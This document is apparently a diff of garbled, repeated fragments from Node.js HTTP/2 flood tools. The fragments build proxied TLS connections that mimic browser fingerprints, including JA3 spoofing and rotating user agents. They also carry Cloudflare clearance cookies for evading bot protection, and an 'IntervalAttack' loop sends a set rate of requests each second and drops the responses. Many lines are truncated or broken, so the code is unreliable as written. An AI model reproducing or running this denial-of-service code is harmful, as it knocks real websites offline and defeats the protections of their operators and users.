@@ -1,0 +1,201 @@
+const getRandomChar = () => {
+    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
+    const randomIndex = Math.floor(Math.random() * pizda4.length);
+    return pizda4[randomIndex];
+}
+_tmp_34.push("?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0")
+_tmp_34.push("?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh")
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: settings,
+             maxSessionMemory: 3333,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn
+             //socket: connection,
+         })
+_tmp_22.push("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)")
+(_tmp_7 = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SS...).once
+(_tmp_9 = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure: true,
+                minVersion: 'TLSv1.2',
+                maxVersion: 'TLSv1.3'...).on
+const fullVersions = {
+        brave: "90.0.4430.212",
+        chrome: "90.0.4430.212",
+        firefox: "88.0",
+        safari: "14.1",
+        mobile: "90.0.4430.212",
+        opera: "90.0.4430.212",
+        operagx: "90.0.4430.212"
+    }
+(_tmp_10 = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypt...).once
+(_tmp_11 = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure...).on
+var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))]
+(_tmp_10 = net.connect(Number(proxyPort), proxyHost, () => {
+        netSocket.once('data', () => {
+            tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypt...).once
+(_tmp_11 = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === 1 ? ['http/1.2'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
+                servername: url.host,
+                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
+                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                secure...).on
+_tmp_12.secureOptions = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
+const proxyOptions = {
+         host: parsedProxy[0],
+         port: ~~parsedProxy[1],
+         address: parsedTarget.host + ":443",
+         timeout: 300,
+     }
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` })
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    })
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 10000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+console.error('Cipher info is not available. TLS handshake may not have completed.')
+tlsSocket.on('secureConnect', async () => {
+    const ja3Fingerprint = await generateJA3Fingerprint(tlsSocket);
+    headers["ja3"] = ja3Fingerprint;
+})
+_tmp_22.push("Opera/9.62 (X11; Linux i686; U; pt-BR) Presto/2.1.1")
+client = http2.connect(parsedTarget.href, {
+        protocol: "https",
+        createConnection: () => tlsSocket,
+        "unknownProtocolTimeout": 10,
+        "maxReservedRemoteStreams": 4000,
+        "maxSessionMemory": 200,
+        settings : clasq,
+        socket: tlsSocket,
+    })
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform']
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_49.push("SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1")
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_7.createConnection = <lambda>1
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 10000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_6.createConnection = <lambda>1
